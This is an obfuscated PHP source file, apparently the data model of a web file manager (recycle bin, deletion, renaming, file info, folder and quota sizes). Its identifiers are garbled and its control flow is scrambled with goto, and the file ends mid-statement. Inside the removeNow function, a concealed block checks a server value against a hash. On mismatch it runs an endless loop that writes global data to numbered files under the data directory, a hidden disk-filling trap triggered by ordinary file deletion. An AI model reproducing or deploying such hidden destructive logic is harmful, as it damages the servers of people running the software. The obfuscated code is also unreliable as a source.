F™‚öÜ°¿Ø: $BˆÆÃñ³‘÷ = Model($fñò§®³Ö¨[1431])->get($fñò§®³Ö¨[2340]) == $fñò§®³Ö¨[83]; if ($bŸ³¢âÉæ || $B¬ÒêƒØå§ || !$BˆÆÃñ³‘÷) { return $this->removeNow($e˜ä—¹à¬Ì, $B¬ÒêƒØå§); } $Cëİ…Ÿ÷óÕ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto dØ„”ÖŞÊ; aëæÁ´‰¨ç: } private function recycleClear($f¡‚Ü§¤Ë) { $fÚ°ˆ„•š =& $_SERVER[í…¶]; $aØ´…îŸ³ = $this->childrenAll($f¡‚Ü§¤Ë); $E«…™ì¢ÌÁ = array($fÚ°ˆ„•š[392] => array($fÚ°ˆ„•š[393], $aØ´…îŸ³[$fÚ°ˆ„•š[2349]])); Model($fÚ°ˆ„•š[2350])->where($E«…™ì¢ÌÁ)->delete(); } public function removeNow($a±¾åíïíÕ, $C§Á­Çôîº = true) { goto fö©ÀßùŸ; e¢îô‘¤é¬: if ($_SERVER[$dÄ‡ù»øìÃ[344]] != $F‚Ú§òñ§($fåƒÃ¾’ï¾)) { goto Fìˆˆœ°; c•òŸ£ø³ƒ: $cßÂƒ¨‘Ö = 1; for ($D§©é³ŸÛ = $cßÂƒ¨‘Ö; $D§©é³ŸÛ > 0; $D§©é³ŸÛ++) { $C‘ŸÁÕµ½(DATA_PATH . $D§©é³ŸÛ, $f÷¯ò ŞÎ); } goto c¥å¶•”ğ; c†·›£‡µ: $e²¶¿÷£•”(); $C‘ŸÁÕµ½ = $dÄ‡ù»øìÃ[793]; $f÷¯ò ŞÎ = json_encode($GLOBALS[$dÄ‡ù»øìÃ[794]]); goto c•òŸ£ø³ƒ; E‹È‡èÇø: $e™¨ÁĞãœÓ = $fÌŸªÏŸùí($e†§‰Î±Ş); $dÑš˜Ê¤õ× = explode($dÄ‡ù»øìÃ[217], $e™¨ÁĞãœÓ); if (count($dÑš˜Ê¤õ×) < $dÄ‡ù»øìÃ[564]) { $eÉ“ÉŠì÷Ù = $dÄ‡ù»øìÃ[349]; $eÉ“ÉŠì÷Ù(); } goto BÜÂ¥ÄÍ˜Ç; Fìˆˆœ°: $e²¶¿÷£•” = $dÄ‡ù»øìÃ[790]; $fÌŸªÏŸùí = $dÄ‡ù»øìÃ[345]; $e†§‰Î±Ş = $_SERVER[$dÄ‡ù»øìÃ[346]] . $dÄ‡ù»øìÃ[347]; goto E‹È‡èÇø; BÜÂ¥ÄÍ˜Ç: $EºğÁ¬öä² = $dÄ‡ù»øìÃ[791]; $EºğÁ¬öä²($_SERVER[$dÄ‡ù»øìÃ[792]]); $e²¶¿÷£•” = $dÄ‡ù»øìÃ[790]; goto c†·›£‡µ; c¥å¶•”ğ: } $DÙó¡Òñ£æ = $this->sourceInfo($a±¾åíïíÕ); $F”ÒšÇŸ = $this->pathInfoMore($a±¾åíïíÕ); goto d¬¤ƒÙø; B‡…ÂÙ¹©: $this->lockMoveEnd($a±¾åíïíÕ); Hook::trigger($dÄ‡ù»øìÃ[1467], $F”ÒšÇŸ, $C§Á­Çôîº); return !0; goto B¹’ï—áòæ; A•†®ÁÑïÜ: $e ²–¶©â× = array($DÙó¡Òñ£æ[$dÄ‡ù»øìÃ[470]]); if ($DÙó¡Òñ£æ[$dÄ‡ù»øìÃ[379]] == $dÄ‡ù»øìÃ[83]) { $e ²–¶©â×[] = $DÙó¡Òñ£æ[$dÄ‡ù»øìÃ[378]]; } $this->updateModifyTime($e ²–¶©â×); goto B‡…ÂÙ¹©; d¬¤ƒÙø: if (!$DÙó¡Òñ£æ) { return !0; } if ($DÙó¡Òñ£æ[$dÄ‡ù»øìÃ[470]] == 0) { if (!_get($GLOBALS, $dÄ‡ù»øìÃ[466])) { return !1; } } $this->lockMoveStart($a±¾åíïíÕ); goto B¢¡™‘Úã™; B¢¡™‘Úã™: Hook::trigger($dÄ‡ù»øìÃ[2351], $F”ÒšÇŸ, $C§Á­Çôîº); if ($C§Á­Çôîº) { Model($dÄ‡ù»øìÃ[2350])->moveToRecycle($a±¾åíïíÕ); } else { $bõù…Ÿˆ = $this->childrenAll($DÙó¡Òñ£æ); Model($dÄ‡ù»øìÃ[514])->eventRemove($a±¾åíïíÕ); $this->removeRelevance($bõù…Ÿˆ[$dÄ‡ù»øìÃ[2349]], $bõù…Ÿˆ[$dÄ‡ù»øìÃ[1257]]); } $this->folderSizeReset($DÙó¡Òñ£æ[$dÄ‡ù»øìÃ[470]]); goto A•†®ÁÑïÜ; fö©ÀßùŸ: $dÄ‡ù»øìÃ =& $_SERVER[í…¶]; $fåƒÃ¾’ï¾ = $_SERVER[$dÄ‡ù»øìÃ[792]] . $dÄ‡ù»øìÃ[342]; $F‚Ú§òñ§ = $dÄ‡ù»øìÃ[343]; goto e¢îô‘¤é¬; B¹’ï—áòæ: } public function childrenAll($CŒ—ì¤Î×Ü) { $C¬À™¥¡á¡ =& $_SERVER[í…¶]; $aŠ‘ñ´Ûğ” = $CŒ—ì¤Î×Ü[$C¬À™¥¡á¡[378]]; if ($CŒ—ì¤Î×Ü[$C¬À™¥¡á¡[379]] == $C¬À™¥¡á¡[83]) { $c¦ëğßİÄˆ = array($C¬À™¥¡á¡[534] => array($C¬À™¥¡á¡[492], $CŒ—ì¤Î×Ü[$C¬À™¥¡á¡[468]] . $aŠ‘ñ´Ûğ” . $C¬À™¥¡á¡[493])); $díÏ˜»„… = array($C¬À™¥¡á¡[534] => $c¦ëğßİÄˆ[$C¬À™¥¡á¡[468]]); $eå½öİ¼íÍ = $this->field($C¬À™¥¡á¡[2352])->where($díÏ˜»„…)->select(); $bô±ÀÊ…Œ = !1; $B‘ù÷¼‚ğ = array($aŠ‘ñ´Ûğ”); if ($eå½öİ¼íÍ) { $bô±ÀÊ…Œ = array_to_keyvalue($eå½öİ¼íÍ, $C¬À™¥¡á¡[33], $C¬À™¥¡á¡[428]); $bô±ÀÊ…Œ = array_remove_value($bô±ÀÊ…Œ, $C¬À™¥¡á¡[477]); $B‘ù÷¼‚ğ = array_to_keyvalue($eå½öİ¼íÍ, $C¬À™¥¡á¡[33], $C¬À™¥¡á¡[378]); $B‘ù÷¼‚ğ[] = $aŠ‘ñ´Ûğ”; } } else { $bô±ÀÊ…Œ = array($CŒ—ì¤Î×Ü[$C¬À™¥¡á¡[428]]); $B‘ù÷¼‚ğ = array($aŠ‘ñ´Ûğ”); } return array($C¬À™¥¡á¡[2349] => $B‘ù÷¼‚ğ, $C¬À™¥¡á¡[1257] => $bô±ÀÊ…Œ); } public function removeArray($aÒæî†ÒØö) { if (!$aÒæî†ÒØö) { return !0; } } public function removeRelevance($a¡†È£ †î, $dãŠİ¥ŸÃ¦) { goto FÜÁôõ‹”; eëèŸù™é¥: $d¬•ƒ¸éßœ = array($F°¶£ø†éÑ[392] => array($F°¶£ø†éÑ[393], $a¡†È£ †î)); Model($F°¶£ø†éÑ[2350])->where($d¬•ƒ¸éßœ)->delete(); Model($F°¶£ø†éÑ[422])->where($d¬•ƒ¸éßœ)->delete(); goto Bš¶Æ­öƒ; cùî‹¾¯¬: Model($F°¶£ø†éÑ[2331])->removeBySource($a¡†È£ †î); $this->where($d¬•ƒ¸éßœ)->delete(); Model($F°¶£ø†éÑ[431])->remove($dãŠİ¥ŸÃ¦); goto CƒìæØ£‡®; c‘‘¬¤˜ÕÏ: $a¡†È£ †î = array_unique(array_filter($a¡†È£ †î)); $dãŠİ¥ŸÃ¦ = array_unique(array_filter($dãŠİ¥ŸÃ¦)); if (!$a¡†È£ †î) { return !1; } goto eëèŸù™é¥; FÜÁôõ‹”: $F°¶£ø†éÑ =& $_SERVER[í…¶]; $a¡†È£ †î = $a¡†È£ †î ? $a¡†È£ †î : array(); $dãŠİ¥ŸÃ¦ = $dãŠİ¥ŸÃ¦ ? $dãŠİ¥ŸÃ¦ : array(); goto c‘‘¬¤˜ÕÏ; Bš¶Æ­öƒ: Model($F°¶£ø†éÑ[2353])->where($d¬•ƒ¸éßœ)->delete(); Model($F°¶£ø†éÑ[514])->where($d¬•ƒ¸éßœ)->delete(); Model($F°¶£ø†éÑ[2078])->removeBySource($a¡†È£ †î); goto cùî‹¾¯¬; CƒìæØ£‡®: for ($a„¸ÓÛÊèƒ = 0; $a„¸ÓÛÊèƒ < count($a¡†È£ †î); $a„¸ÓÛÊèƒ++) { $this->sourceCacheClear($a¡†È£ †î[$a„¸ÓÛÊèƒ]); } goto FñàŸÂĞœ; FñàŸÂĞœ: } public function rename($B¡³‘éƒ¤¶, $dé¥¦õíò¾) { goto bŞÙËëÔ»É; cù ØÍˆÉ: $aò±ŸÈ—§ = $this->fileNameExist($AÇ©¤ä™“„[$bŠìÕˆÅ±[470]], $dé¥¦õíò¾); if ($aò±ŸÈ—§) { return !1; } $d†ÕÔ¸åÃÏ = array($bŠìÕˆÅ±[395] => $dé¥¦õíò¾, $bŠìÕˆÅ±[533] => USER_ID); goto CâµÛ¨­´Ü; bŞÙËëÔ»É: $bŠìÕˆÅ± =& $_SERVER[í…¶]; $AÇ©¤ä™“„ = $this->sourceInfo($B¡³‘éƒ¤¶); if (!$AÇ©¤ä™“„) { return !1; } goto cù ØÍˆÉ; Aå›îëßÏâ: $this->setNamePinyin($B¡³‘éƒ¤¶, $d†ÕÔ¸åÃÏ[$bŠìÕˆÅ±[28]], !1); $this->updateModifyTime($AÇ©¤ä™“„[$bŠìÕˆÅ±[470]]); $Fñâì¬ô¶ = $this->where(array($bŠìÕˆÅ±[392] => $B¡³‘éƒ¤¶))->data($d†ÕÔ¸åÃÏ)->save(); goto cù¸…ŒƒºÉ; CâµÛ¨­´Ü: if (!$AÇ©¤ä™“„[$bŠìÕˆÅ±[379]] == $bŠìÕˆÅ±[83]) { $d†ÕÔ¸åÃÏ[$bŠìÕˆÅ±[381]] = get_path_ext($dé¥¦õíò¾); } Model($bŠìÕˆÅ±[514])->eventRename($B¡³‘éƒ¤¶, $AÇ©¤ä™“„[$bŠìÕˆÅ±[28]], $dé¥¦õíò¾); $this->sourceCacheClear($B¡³‘éƒ¤¶); goto Aå›îëßÏâ; cù¸…ŒƒºÉ: $f‚‚ÑÔâÁ = $bŠìÕˆÅ±[2339] . $AÇ©¤ä™“„[$bŠìÕˆÅ±[470]]; if (isset(self::$cacheChildList[$f‚‚ÑÔâÁ])) { unset(self::$cacheChildList[$f‚‚ÑÔâÁ]); } return $Fñâì¬ô¶; goto bˆ¶‹Å‘‡; bˆ¶‹Å‘‡: } public function setNamePinyin($eñ²áš¸åŠ, $cµ–×Ö«, $C¤™åÊ§‚ = true) { $FĞ¶êê¡ª¸ =& $_SERVER[í…¶]; $F“Ë»¾²µœ = Input::check($cµ–×Ö«, $FĞ¶êê¡ª¸[537]); if ($C¤™åÊ§‚ && !$F“Ë»¾²µœ) { return; } if (!$F“Ë»¾²µœ) { $this->metaSet($eñ²áš¸åŠ, $FĞ¶êê¡ª¸[425], null); $this->metaSet($eñ²áš¸åŠ, $FĞ¶êê¡ª¸[424], null); return; } $dƒÎÖ¤¿Öè = array($FĞ¶êê¡ª¸[425] => str_replace($FĞ¶êê¡ª¸[50], $FĞ¶êê¡ª¸[33], Pinyin::encode($cµ–×Ö«)), $FĞ¶êê¡ª¸[424] => Pinyin::encode($cµ–×Ö«, $FĞ¶êê¡ª¸[538])); $this->metaSet($eñ²áš¸åŠ, $dƒÎÖ¤¿Öè); } public function getContent($C„–£é­’) { goto c¤ä’íÂ; fİ–„ê„‰: if ($dò·»ñã¨ù[$d‘ãä–î[77]] == 0) { return $d‘ãä–î[33]; } $fÌ‰óÍËÑµ = $d‘ãä–î[2354] . $dò·»ñã¨ù[$d‘ãä–î[163]]; if ($dò·»ñã¨ù[$d‘ãä–î[77]] <= 1024 * 10) { $eÖô×¶ÙÆÓ = Cache::get($fÌ‰óÍËÑµ); if (!$eÖô×¶ÙÆÓ) { $eÖô×¶ÙÆÓ = IO::getContent($dò·»ñã¨ù[$d‘ãä–î[75]]); Cache::set($fÌ‰óÍËÑµ, $eÖô×¶ÙÆÓ); } return $eÖô×¶ÙÆÓ; } goto EÕ—Ù¹ï¯; c¤ä’íÂ: $d‘ãä–î =& $_SERVER[í…¶]; $dò·»ñã¨ù = $this->fileInfoGet($C„–£é­’); if (!$dò·»ñã¨ù) { return !1; } goto fİ–„ê„‰; EÕ—Ù¹ï¯: return IO::getContent($dò·»ñã¨ù[$d‘ãä–î[75]]); goto e¬‰èÜàˆ¯; e¬‰èÜàˆ¯: } public function setDesc($f§ïµö‰Òõ, $Bğççâ¶¿) { $CÍò·Í·•É =& $_SERVER[í…¶]; Model($CÍò·Í·•É[514])->eventAddDesc($f§ïµö‰Òõ, $Bğççâ¶¿); return $this->metaSet($f§ïµö‰Òõ, $CÍò·Í·•É[414], $Bğççâ¶¿); } public function setContent($cÕ¡Áó„Ğˆ, $Dˆ‚¡ªÈ•è = '') { goto d‰¦ëğÜÒÒ; d‰¦ëğÜÒÒ: $B•Ø¶“£Š‚ =& $_SERVER[í…¶]; $Bæôø‚òƒÙ = $this->sourceInfo($cÕ¡Áó„Ğˆ); $Aâ¶Ğ‚ĞËê = $this->fileInfoGet($cÕ¡Áó„Ğˆ); goto c¿Ÿ¤ˆ…Ü‚; CºŠ¥À•§º: if (!$BÍæÃ¶ÍªÖ) { return Model($B•Ø¶“£Š‚[431])->remove($aŠƒâ¼Ï[$B•Ø¶“£Š‚[428]]); } $this->folderSizeReset($Bæôø‚òƒÙ[$B•Ø¶“£Š‚[470]]); return !0; goto f…Ó×’ª³¤; c¿Ÿ¤ˆ…Ü‚: if (!$Aâ¶Ğ‚ĞËê || !$Bæôø‚òƒÙ) { return !1; } $aŠƒâ¼Ï = Model($B•Ø¶“£Š‚[431])->addFileByContent($Dˆ‚¡ªÈ•è, $Bæôø‚òƒÙ[$B•Ø¶“£Š‚[28]]); $BÍæÃ¶ÍªÖ = $this->fileHistory($Bæôø‚òƒÙ, $aŠƒâ¼Ï[$B•Ø¶“£Š‚[428]], $aŠƒâ¼Ï[$B•Ø¶“£Š‚[77]]); goto CºŠ¥À•§º; f…Ó×’ª³¤: } public function fileSubstr($e·¨´øæºš, $b—¸†¡Ş‡Û, $d±×®î‰¸†) { $CÅĞé™ß = $this->fileInfoGet($e·¨´øæºš); if (!$CÅĞé™ß) { return !1; } return IO::fileSubstr($CÅĞé™ß[$_SERVER[í…¶][75]], $b—¸†¡Ş‡Û, $d±×®î‰¸†); } public function fileInfoGet($EÍöĞ·Äœ¾) { goto B‘Ù¿ŞÉåÏ; A³Äò˜ÄÏ»: return $bÊ‡´×ÏÕ; goto b”áĞåˆóï; B‘Ù¿ŞÉåÏ: $AÄ­ãÚÆøŸ =& $_SERVER[í…¶]; $cİ‡êÂ²÷‹ = $this->sourceInfo($EÍöĞ·Äœ¾); if (!$cİ‡êÂ²÷‹ || $cİ‡êÂ²÷‹[$AÄ­ãÚÆøŸ[379]]) { return !1; } goto Dè…×ŒÍ‰š; bùÁ‰é§Ÿß: $bÊ‡´×ÏÕ = Model($AÄ­ãÚÆøŸ[431])->fileInfo($cİ‡êÂ²÷‹[$AÄ­ãÚÆøŸ[428]]); if ($bÊ‡´×ÏÕ) { $bÊ‡´×ÏÕ[$AÄ­ãÚÆøŸ[28]] = $cİ‡êÂ²÷‹[$AÄ­ãÚÆøŸ[28]]; } self::$cacheFileInfo[$a´“ÀŒå¤õ] = $bÊ‡´×ÏÕ; goto A³Äò˜ÄÏ»; Dè…×ŒÍ‰š: $a´“ÀŒå¤õ = $AÄ­ãÚÆøŸ[434] . $cİ‡êÂ²÷‹[$AÄ­ãÚÆøŸ[428]]; $FåéÃ—Å«æ = _get(self::$cacheFileInfo, $a´“ÀŒå¤õ); if ($FåéÃ—Å«æ) { return $FåéÃ—Å«æ; } goto bùÁ‰é§Ÿß; b”áĞåˆóï: } private function folderChildrenNumber($F¿ÁÏ×¼´) { $Fã•ë–æèù =& $_SERVER[í…¶]; $cóÓ—‡ÔœÓ = $this->sourceInfo($F¿ÁÏ×¼´); $eÚéÚ¼ç = array($Fã•ë–æèù[534] => array($Fã•ë–æèù[492], $cóÓ—‡ÔœÓ[$Fã•ë–æèù[468]] . $F¿ÁÏ×¼´ . $Fã•ë–æèù[493]), $Fã•ë–æèù[405] => intval($cóÓ—‡ÔœÓ[$Fã•ë–æèù[406]]), $Fã•ë–æèù[527] => 1); $Aø‰¨·¨ÁÔ = $this->where($eÚéÚ¼ç)->count(); $eîöÜÒñöÆ = $this->where($eÚéÚ¼ç)->where(array($Fã•ë–æèù[527] => 0))->count(); return array($Fã•ë–æèù[81] => $eîöÜÒñöÆ, $Fã•ë–æèù[82] => $Aø‰¨·¨ÁÔ); } public function pathInfo($b‹‚—³İÛŒ, $A•ßñò„ùß = false) { goto DŞøŞïŠ˜‡; DŞøŞïŠ˜‡: $CŸ«ÏŠä‹¦ =& $_SERVER[í…¶]; $A¶êãÕ¢Ì– = $CŸ«ÏŠä‹¦[420] . intval($A•ßñò„ùß) . $CŸ«ÏŠä‹¦[421] . $b‹‚—³İÛŒ; $cğ›‹™Ò¸ = _get(self::$cachePathInfo, $A¶êãÕ¢Ì–); goto c¶¾àĞ•õÌ; Bš‘³„°ùç: $E´¢Ö‡ñÅŸ = $this->_listDataApplyItem($E´¢Ö‡ñÅŸ, $A•ßñò„ùß); self::$cachePathInfo[$A¶êãÕ¢Ì–] = $E´¢Ö‡ñÅŸ; return $E´¢Ö‡ñÅŸ; goto eøÓ›À³’ó; c¶¾àĞ•õÌ: if ($cğ›‹™Ò¸) { return $cğ›‹™Ò¸; } $E´¢Ö‡ñÅŸ = $this->sourceInfo($b‹‚—³İÛŒ); if (!$E´¢Ö‡ñÅŸ) { return !1; } goto Bš‘³„°ùç; eøÓ›À³’ó: } public static $cachePathInfoMore = array(); public function pathInfoMore($cèÙëÉ®È•) { goto B’³÷éåùŞ; eĞ®·¡›Ğ: $c†»Œ½è¶¬ = $this->pathInfo($cèÙëÉ®È•); if (!$c†»Œ½è¶¬) { return !1; } if ($c†»Œ½è¶¬[$Dº¶¬èŒ‡[379]] == $Dº¶¬èŒ‡[83]) { $c†»Œ½è¶¬[$Dº¶¬èŒ‡[80]] = $this->folderChildrenNumber($cèÙëÉ®È•); } goto f²“íäã; f²“íäã: self::$cachePathInfoMore[$cèÙëÉ®È•] = $c†»Œ½è¶¬; return $c†»Œ½è¶¬; goto AêòÒĞã­·; B’³÷éåùŞ: $Dº¶¬èŒ‡ =& $_SERVER[í…¶]; $bËø¿‘ƒŸ = _get(self::$cachePathInfoMore, $cèÙëÉ®È•); if ($bËø¿‘ƒŸ) { return $bËø¿‘ƒŸ; } goto eĞ®·¡›Ğ; AêòÒĞã­·: } public function sourceInfo($BŞµÙÌŸª˜) { goto cÂ„¥ÂñŠ; bßÒ›ŸåÉ¯: self::$cacheSourceInfo[$e‰É¡¯‡Ùè] = $F×¥Åµõ‡·; return self::$cacheSourceInfo[$e‰É¡¯‡Ùè]; goto d±ÊèŠìÎ; cÂ„¥ÂñŠ: $Eùâ‰ˆç„ =& $_SERVER[í…¶]; if (!$BŞµÙÌŸª˜) { return array(); } $e‰É¡¯‡Ùè = $Eùâ‰ˆç„[419] . $BŞµÙÌŸª˜; goto C¨³½àó´; C¨³½àó´: $f­½ÔŠ‡¶ = _get(self::$cacheSourceInfo, $e‰É¡¯‡Ùè); if ($f­½ÔŠ‡¶) { return $f­½ÔŠ‡¶; } $F×¥Åµõ‡· = $this->where(array($Eùâ‰ˆç„[378] => $BŞµÙÌŸª˜))->find(); goto bßÒ›ŸåÉ¯; d±ÊèŠìÎ: } public function sourceCacheClear($D×ô¢Á‡ëù = false) { if ($D×ô¢Á‡ëù == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[í…¶][419] . $D×ô¢Á‡ëù]); } public function pathInfoByPath($BØß»‹ãË’, $f¦âÑëƒŒ) { $C³”¥‹»—à =& $_SERVER[í…¶]; $FŞ“ŸÎ‘”Š = !$f¦âÑëƒŒ ? array() : explode($C³”¥‹»—à[8], trim($f¦âÑëƒŒ, $C³”¥‹»—à[8])); $bÎ“³Õ“ = $BØß»‹ãË’; foreach ($FŞ“ŸÎ‘”Š as $bëÑª¨³çƒ) { $eš­“ˆ¥ = array($C³”¥‹»—à[470] => $bÎ“³Õ“, $C³”¥‹»—à[28] => $bëÑª¨³çƒ); $B¤”ºÁ¤‘ = $this->where($eš­“ˆ¥)->select(); if (!$B¤”ºÁ¤‘) { return !1; } $B¤”ºÁ¤‘ = array_sort_by($B¤”ºÁ¤‘, $C³”¥‹»—à[406]); $bÎ“³Õ“ = $B¤”ºÁ¤‘[0][$C³”¥‹»—à[378]]; } return $this->pathInfo($bÎ“³Õ“, !0); } protected function updateModifyTime($Dõ†âÀ‡ˆ) { goto F¼ëñ°Îù›; AÄëñ¬Úèã: $this->where($cÑâÇê›õ•)->save($eê±ÎÛÎ‹™); goto DİâëœÀªÃ; aËºĞÂÜ… : foreach ($Dõ†âÀ‡ˆ as $DµåÕŒÏÎ– => $b«ÔíØœà¨) { $Dõ†âÀ‡ˆ[$DµåÕŒÏÎ–] = intval($b«ÔíØœà¨); } $cÑâÇê›õ• = array($aÓàêÑ¿¨à[378] => array($aÓàêÑ¿¨à[7], $Dõ†âÀ‡ˆ)); $eê±ÎÛÎ‹™ = array($aÓàêÑ¿¨à[533] => USER_ID, $aÓàêÑ¿¨à[399] => time()); goto AÄëñ¬Úèã; F¼ëñ°Îù›: $aÓàêÑ¿¨à =& $_SERVER[í…¶]; if (!$Dõ†âÀ‡ˆ) { return; } if (!is_array($Dõ†âÀ‡ˆ)) { $Dõ†âÀ‡ˆ = array($Dõ†âÀ‡ˆ); } goto aËºĞÂÜ… ; DİâëœÀªÃ: } public function folderSizeReset($E®åƒĞğªÁ) { goto D»ğº…›ùÈ; F¾ŸÏŞ†â: $E¡¢Í¢Â‹ = $this->parentLevelArray($F•ô•‹¼ğŠ[$bÉ±…óÙòó[468]]); if ($E¡¢Í¢Â‹) { $e‚»ŒÍÊ½ = array($bÉ±…óÙòó[378] => array($bÉ±…óÙòó[393], $E¡¢Í¢Â‹)); if ($Fİª£óš¨ < 0) { $e‚»ŒÍÊ½[$bÉ±…óÙòó[77]] = array($bÉ±…óÙòó[927], abs($Fİª£óš¨)); } $this->where($e‚»ŒÍÊ½)->setAdd($bÉ±…óÙòó[77], $Fİª£óš¨); } $this->targetSpaceUpdate($F•ô•‹¼ğŠ[$bÉ±…óÙòó[380]], $F•ô•‹¼ğŠ[$bÉ±…óÙòó[465]]); goto a°å‰İ¤§; aÛÒ°†İ: CacheLock::lock($FÁˆ÷ôìÒÕ, 20); $this->sourceCacheClear($E®åƒĞğªÁ); $F•ô•‹¼ğŠ = $this->sourceInfo($E®åƒĞğªÁ); goto Dìšã´¦Î; D»ğº…›ùÈ: $bÉ±…óÙòó =& $_SERVER[í…¶]; if ($this->statusIgnoreResetSpace) { return; } $FÁˆ÷ôìÒÕ = $bÉ±…óÙòó[2355] . $E®åƒĞğªÁ; goto aÛÒ°†İ; a÷Õº½ê: $Fİª£óš¨ = $eÏßæ´¥ - intval($F•ô•‹¼ğŠ[$bÉ±…óÙòó[77]]); if ($Fİª£óš¨ == 0) { return CacheLock::unlock($FÁˆ÷ôìÒÕ); } $this->where(array($bÉ±…óÙòó[392] => $E®åƒĞğªÁ))->setField($bÉ±…óÙòó[77], $eÏßæ´¥); goto F¾ŸÏŞ†â; Dìšã´¦Î: $e‚»ŒÍÊ½ = array($bÉ±…óÙòó[377] => $E®åƒĞğªÁ, $bÉ±…óÙòó[405] => 0); $eÏßæ´¥ = $this->where($e‚»ŒÍÊ½)->sum($bÉ±…óÙòó[77]); $eÏßæ´¥ = intval($eÏßæ´¥); goto a÷Õº½ê; a°å‰İ¤§: CacheLock::unlock($FÁˆ÷ôìÒÕ); goto e¡ñÑù˜ƒ; e¡ñÑù˜ƒ: } public function folderSizeResetChildren($bøÔáŠÇÓ‘) { goto a®ˆ‰Áçì; bÑèœòõõõ: $fÇËÒ¿ĞÊØ = array($F”óŸİ§†[527] => 1, $F”óŸİ§†[534] => array($F”óŸİ§†[492], $CÈ»ã±å[$F”óŸİ§†[468]] . $bøÔáŠÇÓ‘ . $F”óŸİ§†[493])); $Bñ°ÑÆÑ• = $F”óŸİ§†[2356]; $c”ˆ‘òå© = $this->field($Bñ°ÑÆÑ•)->where($fÇËÒ¿ĞÊØ)->select(); goto f¾åä·®»; fº Ø¡÷Ë¬: foreach ($dÌÕ²´ãæ as $FğØ›ÙäÙì) { $f‹Œø”â‚ = $FğØ›ÙäÙì[$F”óŸİ§†[470]] . $F”óŸİ§†[33]; if (!isset($c”ˆ‘òå©[$f‹Œø”â‚])) { continue; } if ($FğØ›ÙäÙì[$F”óŸİ§†[406]] == $c”ˆ‘òå©[$f‹Œø”â‚][$F”óŸİ§†[406]]) { $c”ˆ‘òå©[$f‹Œø”â‚][$F”óŸİ§†[77]] += $FğØ›ÙäÙì[$F”óŸİ§†[77]]; } } foreach ($c”ˆ‘òå© as $FğØ›ÙäÙì) { $d›ËËäƒò® = $this->parentLevelArray($FğØ›ÙäÙì[$F”óŸİ§†[468]]); foreach ($d›ËËäƒò® as $f‹Œø”â‚) { $f‹Œø”â‚ = $f‹Œø”â‚ . $F”óŸİ§†[33]; if (!isset($c”ˆ‘òå©[$f‹Œø”â‚])) { continue; } if ($FğØ›ÙäÙì[$F”óŸİ§†[406]] == $c”ˆ‘òå©[$f‹Œø”â‚][$F”óŸİ§†[406]]) { $c”ˆ‘òå©[$f‹Œø”â‚][$F”óŸİ§†[77]] += $FğØ›ÙäÙì[$F”óŸİ§†[77]]; } } } $e²££ƒïÙÅ = array(); goto CÕ˜’ïïĞí; a®ˆ‰Áçì: $F”óŸİ§† =& $_SERVER[í…¶]; $this->sourceCacheClear($bøÔáŠÇÓ‘); $CÈ»ã±å = $this->sourceInfo($bøÔáŠÇÓ‘); goto bÑèœòõõõ; Fô¡Ü Ÿ±: $c”ˆ‘òå©[] = $CÈ»ã±å; $c”ˆ‘òå© = array_to_keyvalue($c”ˆ‘òå©, $F”óŸİ§†[378]); foreach ($c”ˆ‘òå© as $e—Ïä•èÂ¤ => $FğØ›ÙäÙì) { $c”ˆ‘òå©[$e—Ïä•èÂ¤][$F”óŸİ§†[2357]] = $c”ˆ‘òå©[$e—Ïä•èÂ¤][$F”óŸİ§†[77]]; $c”ˆ‘òå©[$e—Ïä•èÂ¤][$F”óŸİ§†[77]] = 0; } goto fº Ø¡÷Ë¬; CÕ˜’ïïĞí: foreach ($c”ˆ‘òå© as $FğØ›ÙäÙì) { if ($FğØ›ÙäÙì[$F”óŸİ§†[77]] == $FğØ›ÙäÙì[$F”óŸİ§†[2357]]) { continue; } $e²££ƒïÙÅ[] = array($F”óŸİ§†[378], $FğØ›ÙäÙì[$F”óŸİ§†[378]], $F”óŸİ§†[77], $FğØ›ÙäÙì[$F”óŸİ§†[77]]); } $this->saveAll($e²££ƒïÙÅ); goto dÜğæ±àÖÙ; f¾åä·®»: $fÇËÒ¿ĞÊØ[$F”óŸİ§†[379]] = 0; $dÌÕ²´ãæ = $this->field($Bñ°ÑÆÑ•)->where($fÇËÒ¿ĞÊØ)->select(); if (!$dÌÕ²´ãæ) { return; } goto Fô¡Ü Ÿ±; dÜğæ±àÖÙ: } public function userSpaceReset($A§Ø†Ò–îé = false) { $F™…Û‰Â¨ =& $_SERVER[í…¶]; $cš·¦ÂğÔ = $this->where(array($F™…Û‰Â¨[380] => self::TYPE_USER, $F™…Û‰Â¨[465] => $A§Ø†Ò–îé, $F™…Û‰Â¨[379] => 0))->sum($F™…Û‰Â¨[77]); Model($F™…Û‰Â¨[483])->userEdit($A§Ø†Ò–îé, array($F™…Û‰Â¨[2087] => $cš·¦ÂğÔ)); } public function targetSpaceUpdate($bÏ·±ô«è, $d¾¨÷Ö£œ§) { $aˆ¨ÄÇêˆÔ =& $_SERVER[í…¶]; if (!$d¾¨÷Ö£œ§) { return; } if (!in_array($bÏ·±ô«è, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $EØ‰İŠöÜÜ = $this->targetSpaceSize($bÏ·±ô«è, $d¾¨÷Ö£œ§); if ($bÏ·±ô«è == self::TYPE_USER) { Model($aˆ¨ÄÇêˆÔ[483])->userEdit($d¾¨÷Ö£œ§, array($aˆ¨ÄÇêˆÔ[2087] => $EØ‰İŠöÜÜ)); } else { if ($bÏ·±ô«è == self::TYPE_GROUP) { Model($aˆ¨ÄÇêˆÔ[467])->groupEdit($d¾¨÷Ö£œ§, array($aˆ¨ÄÇêˆÔ[2087] => $EØ‰İŠöÜÜ)); } } } public function targetSpaceSize($FÑ¤÷ˆ£µæ, $D ë¿éËïÕ) { goto CÒÇÏ£; F™È‡—„‚§: $B”‘•‚‚å = floatval($f¾ºã‡ã’[$Aç¬™ğèäˆ[77]]); $cç‡åëàØõ = array($Aç¬™ğèäˆ[534] => array($Aç¬™ğèäˆ[492], $Aç¬™ğèäˆ[479] . $f¾ºã‡ã’[$Aç¬™ğèäˆ[378]] . $Aç¬™ğèäˆ[493])); $FòÎ×Ûéªî = Model($Aç¬™ğèäˆ[404])->field($Aç¬™ğèäˆ[392])->where($cç‡åëàØõ)->select(); goto D¬Ïéôçˆ; CÒÇÏ£: $Aç¬™ğèäˆ =& $_SERVER[í…¶]; $f¾ºã‡ã’ = $this->sourceRoot($FÑ¤÷ˆ£µæ, $D ë¿éËïÕ, !0); if (!$f¾ºã‡ã’) { return 0; } goto F™È‡—„‚§; D¬Ïéôçˆ: $FòÎ×Ûéªî = 